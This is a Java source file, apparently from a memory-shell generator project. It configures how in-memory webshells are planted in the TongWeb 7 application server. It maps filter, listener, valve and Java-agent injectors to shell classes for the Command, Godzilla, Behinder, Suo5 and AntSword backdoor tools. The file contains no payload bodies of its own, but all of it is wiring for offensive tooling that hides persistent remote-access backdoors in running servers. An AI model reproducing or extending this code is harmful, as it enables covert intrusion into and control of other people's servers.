package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.generator.ListenerGenerator;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
import com.reajason.javaweb.memshell.tongweb.antsword.AntSwordValve7;
import com.reajason.javaweb.memshell.tongweb.behinder.BehinderValve7;
import com.reajason.javaweb.memshell.tongweb.command.CommandValve7;
import com.reajason.javaweb.memshell.tongweb.godzilla.GodzillaValve7;
import com.reajason.javaweb.memshell.tongweb.injector.*;
import com.reajason.javaweb.memshell.tongweb.suo5.Suo5Valve7;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/27
 */
public class TongWeb7Shell extends AbstractShell {
    @Override
    protected InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(FILTER, TongWebFilterInjector.class)
                .addInjector(JAKARTA_FILTER, TongWebFilterInjector.class)
                .addInjector(LISTENER, TongWebListenerInjector.class)
                .addInjector(JAKARTA_LISTENER, TongWebListenerInjector.class)
                .addInjector(VALVE, TongWebValveInjector.class)
                .addInjector(JAKARTA_VALVE, TongWebValveInjector.class)
                .addInjector(AGENT_FILTER_CHAIN, TongWebFilterChainAgentInjector.class)
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, TongWebContextValveAgentInjector.class)
                .build();
    }

    @Override
    protected void init() {

        Class<?> commandListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Command);
        addToolMapping(ShellTool.Command, ToolMapping.builder()
                .addShellClass(FILTER, CommandFilter.class)
                .addShellClass(JAKARTA_FILTER, CommandFilter.class)
                .addShellClass(LISTENER, commandListenerClass)
                .addShellClass(JAKARTA_LISTENER, commandListenerClass)
                .addShellClass(VALVE, CommandValve7.class)
                .addShellClass(JAKARTA_VALVE, CommandValve7.class)
                .addShellClass(AGENT_FILTER_CHAIN, CommandFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, CommandFilterChainAdvisor.class)
                .build());

        Class<?> godzillaListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Godzilla);
        addToolMapping(ShellTool.Godzilla, ToolMapping.builder()
                .addShellClass(FILTER, GodzillaFilter.class)
                .addShellClass(JAKARTA_FILTER, GodzillaFilter.class)
                .addShellClass(LISTENER, godzillaListenerClass)
                .addShellClass(JAKARTA_LISTENER, godzillaListenerClass)
                .addShellClass(VALVE, GodzillaValve7.class)
                .addShellClass(JAKARTA_VALVE, GodzillaValve7.class)
                .addShellClass(AGENT_FILTER_CHAIN, GodzillaFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, GodzillaFilterChainAdvisor.class)
                .build());

        Class<?> behinderListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Behinder);
        addToolMapping(ShellTool.Behinder, ToolMapping.builder()
                .addShellClass(FILTER, BehinderFilter.class)
                .addShellClass(JAKARTA_FILTER, BehinderFilter.class)
                .addShellClass(LISTENER, behinderListenerClass)
                .addShellClass(JAKARTA_LISTENER, behinderListenerClass)
                .addShellClass(VALVE, BehinderValve7.class)
                .addShellClass(JAKARTA_VALVE, BehinderValve7.class)
                .addShellClass(AGENT_FILTER_CHAIN, BehinderFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, BehinderFilterChainAdvisor.class)
                .build());

        Class<?> suo5ListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Suo5);
        addToolMapping(ShellTool.Suo5, ToolMapping.builder()
                .addShellClass(FILTER, Suo5Filter.class)
                .addShellClass(JAKARTA_FILTER, Suo5Filter.class)
                .addShellClass(LISTENER, suo5ListenerClass)
                .addShellClass(JAKARTA_LISTENER, suo5ListenerClass)
                .addShellClass(VALVE, Suo5Valve7.class)
                .addShellClass(JAKARTA_VALVE, Suo5Valve7.class)
                .build());

        Class<?> antSwordListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.AntSword);
        addToolMapping(ShellTool.AntSword, ToolMapping.builder()
                .addShellClass(FILTER, AntSwordFilter.class)
                .addShellClass(LISTENER, antSwordListenerClass)
                .addShellClass(VALVE, AntSwordValve7.class)
                .addShellClass(AGENT_FILTER_CHAIN, AntSwordFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, AntSwordFilterChainAdvisor.class)
                .build());
    }
}
